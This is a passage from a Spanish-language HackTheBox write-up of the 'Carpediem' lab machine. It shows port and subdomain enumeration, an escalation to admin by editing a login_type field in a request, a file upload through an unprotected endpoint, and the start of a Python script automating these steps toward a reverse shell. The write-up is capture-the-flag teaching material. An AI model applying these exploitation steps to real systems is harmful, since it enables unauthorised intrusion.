<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox Writeup Carpediem" /><meta property="og:locale" content="en" /><meta name="description" content="Overview:" /><meta property="og:description" content="Overview:" /><link rel="canonical" href="https://e1p0tr0.github.io/posts/HTBCarpediem/" /><meta property="og:url" content="https://e1p0tr0.github.io/posts/HTBCarpediem/" /><meta property="og:site_name" content="Marss" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-05T15:13:12-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Writeup Carpediem" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-09-05T15:13:12-05:00","datePublished":"2022-09-05T15:13:12-05:00","description":"Overview:","headline":"Hackthebox Writeup Carpediem","mainEntityOfPage":{"@type":"WebPage","@id":"https://e1p0tr0.github.io/posts/HTBCarpediem/"},"url":"https://e1p0tr0.github.io/posts/HTBCarpediem/"}</script><title>Hackthebox Writeup Carpediem | Marss</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Marss"><meta name="application-name" content="Marss"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Marss</a></div><div class="site-subtitle font-italic">Freelance Professional [eJPTv2]</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/E1P0TR0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['marsello.guillen','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox Writeup Carpediem</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Writeup Carpediem</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Marsello Guillén</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1662408792" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-09-05 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="6074 words"> <em>33 min</em> read</span></div></div></div><div class="post-content"><h2 id="overview"><span class="mr-2">Overview:</span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Evade login to website by <strong>leaking SQL query</strong><li><strong>Remote code execution</strong> by test function with full access (Container, python scripting)<li><strong>Network host scanning</strong> (bash scripting)<li>Pivoting<li>Evade technical support web by <strong>writing permissions to Mongodb database</strong> (python and javascript scripting)<li><strong>Leak of SSH credentials</strong> in helpdesk and VoIP system (Foothold)<li>Credential leak by <strong>network traffic sniffing capabilities</strong><li><strong>Remote Code Execution</strong> when uploading plugin to CMS Backdrop (Container, CVE-2021-45268, plugin creation)<li>Privilege escalation in container by <strong>running a CMS backdrop script as root</strong><li>Escape a container as root by <strong>exploiting the cgroup system</strong> (CVE-2022-0492) (Privilege Escalation)</ol><hr /><p><img data-src="/assets/img/htb/writeups/carpediem/logo.png" alt="Logo" class="shadow" data-proofer-ignore></p><div class="table-wrapper"><table><thead><tr><th style="text-align: center">OS<th style="text-align: center">IP<th style="text-align: center">Release Date<th style="text-align: center">Difficulty<th style="text-align: center">Points<tbody><tr><td style="text-align: center">Linux<td style="text-align: center">10.10.11.167<td style="text-align: center">25 Jun 2022<td style="text-align: center">Hard<td style="text-align: center">40</table></div><hr /><p>Antes de empezar verificamos que estamos conectado a la <strong>VPN</strong> de HTB y tenemos conexión con la máquina:</p><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">&gt;</span> ping <span class="nt">-c1</span> 10.10.11.167
PING 10.10.11.167 <span class="o">(</span>10.10.11.167<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.11.167: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>105 ms
                                          <span class="se">\_</span>_____________________ Linux Machine
<span class="nt">---</span> 10.10.11.167 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
          <span class="se">\_</span>________________<span class="se">\_</span>___________________________________ Successful connection
rtt min/avg/max/mdev <span class="o">=</span> 105.308/105.308/105.308/0.000 ms
</pre></table></code></div></div><blockquote><p>Explicación de parámetros:</p><p>-c &lt;count&gt; : Número de paquetes ICMP que deseamos enviar a la máquina</p></blockquote><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Con <code class="language-plaintext highlighter-rouge">nmap</code> realizamos un escaneo de tipo <strong>TCP (Transfer Control Protocol)</strong> para descubrir puertos abiertos:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p- -sS --min-rate 5000 -n -Pn 10.10.11.167
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 15:22 -05
Nmap scan report for 10.10.11.167
Host is up (0.11s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
                \_________________ Secure Shell Protocol
80/tcp  open  http
                \_________________ Hypertext Transfer Protocol
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p- : Escanear todos los puertos, del 1 al 65,535</p><p>-sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo</p><p>--min-rate &lt;number&gt; : Enviar una taza (&lt;number&gt;) de paquetes por segundo como mínimo</p><p>-n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)</p><p>-Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneo</p></blockquote><p>Continuamos con un escaneo a profundidad de los puertos <strong>22(SSH) - 80(HTTP)</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p22,80,443 -sCV 10.10.11.167 -oN tcp_openPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 15:24 -05
Nmap scan report for 10.10.11.167
Host is up (0.11s latency).

PORT    STATE  SERVICE VERSION
</span><span class="gp">22/tcp  open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   3072 96:21:76:f7:2d:c5:f0:4e:e0:a8:df:b4:d9:5e:45:26 (RSA)
|   256 b1:6d:e3:fa:da:10:b9:7b:9e:57:53:5c:5b:b7:60:06 (ECDSA)
|_  256 6a:16:96:d8:05:29:d5:90:bf:6b:2a:09:32:dc:36:4f (ED25519)
80/tcp  open   http    nginx 1.18.0 (Ubuntu)
|_http-title: Comming Soon
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp closed https
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p &lt;port_1,port_2,...&gt; : Indicamos que puertos queremos escanear</p><p>-sCV (Fusión de parámetros -sC -sV)</p><p>-sC : Ejecutar en los puertos scripts por defecto de nmap</p><p>-sV : Activar detección de versiones de los servicios que corren por los puertos</p><p>-oN &lt;file&gt; : Guardar el output del escaneo en un archivo con formato Nmap</p></blockquote><p>Empezamos buscando las tecnologías del sitio web <strong>80(HTTP)</strong>:</p><blockquote><p>Usando <code class="language-plaintext highlighter-rouge">whatweb</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">❯ whatweb 10.10.11.167
http://10.10.11.167 [200 OK] Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.167], Meta-Author[Pawel Zuchowski], Script[text/javascript], Title[Comming Soon], X-UA-Compatible[ie=edge], nginx[1.18.0]
</span></pre></table></code></div></div><p><img data-src="/assets/img/htb/writeups/carpediem/http_web.png" alt="HTTPWeb" class="shadow" data-proofer-ignore></p><p>Encontramos un nuevo nombre de dominio <code class="language-plaintext highlighter-rouge">carpediem.htb</code>, probablemente se esté aplicando <strong>Virtual Hosting</strong>, así que lo agregamos a nuestro archivo encargado de la resolución de direcciones IP y nombres de dominio <em>/etc/hosts</em>: <code class="language-plaintext highlighter-rouge">echo "10.10.11.167 carpediem.htb" &gt;&gt; /etc/hosts</code></p><p>Lamentablemente no se aplica y nos encontramos en la misma página</p><p>Luego de enumerar directorios no encontramos nada interesante, así que intentamos enumerar subdominios:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="go">❯ gobuster vhost -t 100 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://carpediem.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://carpediem.htb
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/09/05 16:03:05 Starting gobuster in VHOST enumeration mode
===============================================================
Found: portal.carpediem.htb (Status: 200) [Size: 31090] &lt;---------------- Subdomain!
</span></pre></table></code></div></div><p>Agregamos esté nuevo dominio a nuestro archivo <em>/etc/hosts</em> y encontramos la siguiente interfaz:</p><p><img data-src="/assets/img/htb/writeups/carpediem/portal_http.png" alt="portalWeb" class="shadow" data-proofer-ignore></p><p>Podemos enumerar tecnologías con la extensión <a href="https://www.wappalyzer.com/apps/">Wappalyzer</a> para saber que servidor web que corre por detrás, que lenguajes se aplican, etc.</p><p>Pero de primeras obervamos la opción <strong>Login</strong>, entonces nos creamos una cuenta y entramos:</p><p><img data-src="/assets/img/htb/writeups/carpediem/portal_session.png" alt="portalSession" class="shadow" data-proofer-ignore></p><p>Observamos en nuestra cuenta que tenemos un panel de reservas donde se almacenará el estado de nuestras reservas. Para comprobarlo intentamos hacer una reserva y nos muestra el siguiente mensaje:</p><p><img data-src="/assets/img/htb/writeups/carpediem/possible_cookieStealing.png" alt="possibleCookieStealing" class="shadow" data-proofer-ignore></p><p>Si es cierto lo que dice el mensaje, posiblemente podríamos aplicar un <strong>Secuestro de sesión (Session hijacking)</strong> para robar la cookie de los administradores de la web y tener mayores privilegios. Sin embargo, después de esperar varios minutos no se lográ alterar el estado de nuestra petición, descartando así esta posible brecha de ataque</p><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Después de revisar la página y realizar una enumeración, encontramos la ruta <em>/admin</em> pero nos muestra lo siguiente:</p><p><img data-src="/assets/img/htb/writeups/carpediem/portal_admin_denied.png" alt="adminWeb" class="shadow" data-proofer-ignore></p><p>Sin embargo, al no estar logeados si nos deja acceder a la ruta <em>/admin</em> pero igualmente no podemos registrarnos. Es raro, así que para ver si existe una validación por detrás, usamos <code class="language-plaintext highlighter-rouge">burpsuite</code> para interceptar dicha petición:</p><p><img data-src="/assets/img/htb/writeups/carpediem/admin_burpsuite.png" alt="burpsuite" class="shadow" data-proofer-ignore></p><p>Observamos como respuesta la query de la consulta sobre la base de datos para validar el inicio de sessión, y vemos que pide que el campo <code class="language-plaintext highlighter-rouge">login_type = 1</code>. Probablemente no tengamos ese campo asignado. Para validar nuestros datos volvemos a nuestra sessión, y nos dirigimos al campo <strong>Manage Account</strong>:</p><p><img data-src="/assets/img/htb/writeups/carpediem/portal_manage_account.png" alt="manageAccount" class="shadow" data-proofer-ignore></p><p>Para ver que otros datos corren por detrás, nuevamente interceptamos la petición con <code class="language-plaintext highlighter-rouge">burpsuite</code> y bingo:</p><p><img data-src="/assets/img/htb/writeups/carpediem/update_account_burpsuite.png" alt="updateAccount" class="shadow" data-proofer-ignore></p><p>Observamos que tenemos el campo <code class="language-plaintext highlighter-rouge">login_type=2</code>, entonces lo cambiamos a <strong>1</strong> de manera exitosa, enviamos la petición, volvemos a la ruta <em>/admin/</em> y tendremos acceso a la siguiente interfaz:</p><p><img data-src="/assets/img/htb/writeups/carpediem/store_portal.png" alt="storePortal" class="shadow" data-proofer-ignore></p><p>Volviendo a revisar la página, encontramos el usuario <code class="language-plaintext highlighter-rouge">Jeremy Hammond</code> en la sección Booking List. Además, en la sección <strong>Quarterly Report Upload</strong> encontramos el mensaje <strong>“NOTE: Upload functions still in development!”</strong>. Revisando en código fuente encontramos lo siguiente:</p><p><img data-src="/assets/img/htb/writeups/carpediem/upload_function.png" alt="uploadFun" class="shadow" data-proofer-ignore></p><p>Vemos la función <strong>add_file</strong>, que por el código intuimos que sirve para subir archivos por método <strong>POST</strong> a la dirección <code class="language-plaintext highlighter-rouge">\_base_url\_+"classes/Users.php?f=upload"</code> (base_url se declara al principio del código como <em>http://portal.carpediem.htb/</em>).</p><p>Entonces nos dirigimos a la ruta <em>http://portal.carpediem.htb/classes/Users.php?f=upload</em>:</p><p><img data-src="/assets/img/htb/writeups/carpediem/upload_function_page.png" alt="uploadFun" class="shadow" data-proofer-ignore></p><p>Nos aparece el mensaje <strong>{“error”:”multipart\/form-data missing”}</strong> que sabemos que es parte de la cabezara <strong>Content-Type</strong>, la cuál es usada para indicar el tipo de recurso que se está pasando por la petición.</p><blockquote class="prompt-info"><div><p>Recordemos que para pasar un archivo necesitamos seguir un patrón válido. Especialmente para el <strong>Content-Type: multipart/form-data</strong>, necesitamos usar el campo <strong>boundary</strong>, el cúal sirve como delimitador para la data que pasaremos (puede tomar cualquier valor)</p></div></blockquote><p>Agregamos el <strong>Content-Type</strong>, el <strong>boundary</strong>, el nombre del archivo <strong>(filename)</strong>, y el nombre del campo <strong>(name)</strong> que especifíca el nombre asignado en la etiqueta <em>html</em>, el cuál logramos obtener su nombre al no ponerlo, ya que a principio no sabemos su nombre. Al final queda de esta manera:</p><p><img data-src="/assets/img/htb/writeups/carpediem/upload_burpsuite.png" alt="uploadBurp" class="shadow" data-proofer-ignore></p><p>Exitosamente subimos el archivo y logramos ver su contenido:</p><p><img data-src="/assets/img/htb/writeups/carpediem/php_info.png" alt="phpInfo" class="shadow" data-proofer-ignore></p><p>Ya que podemos subir archivos, entonces cargamos un archivo que ejecute una <strong>shell inversa</strong> a nuestra máquina. Como es costumbre, realizé un script en <code class="language-plaintext highlighter-rouge">python</code> paraautomatizar todo el proceso que vimos hasta el momento y conseguir la shell:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">requests</span> <span class="c1"># pip install requests
</span><span class="kn">import</span> <span class="nn">signal</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">threading</span>

<span class="c1"># variables
</span><span class="n">target_host</span> <span class="o">=</span> <span class="s">'10.10.11.167'</span> 
<span class="n">target_url</span> <span class="o">=</span> <span class="s">'http://portal.carpediem.htb'</span> <span class="c1"># configure DNS (/etc/hosts)
</span>
<span class="n">IP</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

<span class="c1"># ctrl+C (exit the script) 
</span><span class="k">def</span> <span class="nf">ctrl_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
	<span class="k">print</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[!] User Exit.'</span><span class="p">);</span> <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">ctrl_handler</span><span class="p">)</span>

<span class="c1"># get random string (to create account)
</span><span class="k">def</span> <span class="nf">get_randstr</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>

<span class="c1"># register user
</span><span class="k">def</span> <span class="nf">register</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
	<span class="n">user</span> <span class="o">=</span> <span class="n">get_randstr</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
	<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Content-Type'</span> <span class="p">:</span> <span class="s">'application/x-www-form-urlencoded; charset=UTF-8'</span><span class="p">}</span>
	<span class="n">post_data</span> <span class="o">=</span> <span class="s">'&amp;'</span><span class="p">.</span><span class="n">join</span><span class="p">((</span>
		<span class="s">'firstname={data}'</span><span class="p">,</span> 
		<span class="s">'lastname={data}'</span><span class="p">,</span> 
		<span class="s">'contact={data}'</span><span class="p">,</span> 
		<span class="s">'gender=Male'</span><span class="p">,</span> 
		<span class="s">'address='</span><span class="p">,</span> 
		<span class="s">'username={data}'</span><span class="p">,</span> 
		<span class="s">'password={data}'</span><span class="p">)).</span><span class="nb">format</span><span class="p">(</span><span class="n">data</span><span class="o">=</span><span class="n">user</span><span class="p">)</span>

	<span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s">/classes/Master.php?f=register'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>

	<span class="k">return</span> <span class="n">user</span>

<span class="c1"># login user
</span><span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">credentials</span><span class="p">):</span>
	<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Content-Type'</span> <span class="p">:</span> <span class="s">'application/x-www-form-urlencoded; charset=UTF-8'</span><span class="p">}</span>
	<span class="n">post_data</span> <span class="o">=</span> <span class="s">'&amp;'</span><span class="p">.</span><span class="n">join</span><span class="p">((</span>
		<span class="s">'username={data}'</span><span class="p">,</span>
		<span class="s">'password={data}'</span><span class="p">)).</span><span class="nb">format</span><span class="p">(</span><span class="n">data</span><span class="o">=</span><span class="n">credentials</span><span class="p">)</span>

	<span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s">/classes/Login.php?f=login_user'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>

<span class="c1"># change privileges
</span><span class="k">def</span> <span class="nf">change_privileges</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">user_id</span><span class="p">):</span>
	<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Content-Type'</span> <span class="p">:</span> <span class="s">'application/x-www-form-urlencoded; charset=UTF-8'</span><span class="p">}</span>
	<span class="n">post_data</span> <span class="o">=</span> <span class="s">'&amp;'</span><span class="p">.</span><span class="n">join</span><span class="p">((</span>
		<span class="s">'id={id}'</span><span class="p">,</span>
		<span class="s">'login_type=1'</span><span class="p">,</span> <span class="c1"># admin privileges (default=2)
</span>		<span class="s">'firstname={data}'</span><span class="p">,</span>
		<span class="s">'lastname={data}'</span><span class="p">,</span>
		<span class="s">'contact={data}'</span><span class="p">,</span>
		<span class="s">'gender=Male'</span><span class="p">,</span>
		<span class="s">'address='</span><span class="p">,</span>
		<span class="s">'username={data}'</span><span class="p">,</span>
		<span class="s">'password='</span><span class="p">)).</span><span class="nb">format</span><span class="p">(</span><span class="n">data</span><span class="o">=</span><span class="n">user</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="n">user_id</span><span class="p">)</span>
	
	<span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s">/classes/Master.php?f=update_account'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
	
	<span class="k">if</span> <span class="s">'success'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
		<span class="k">return</span> <span class="bp">False</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">return</span> <span class="bp">True</span>

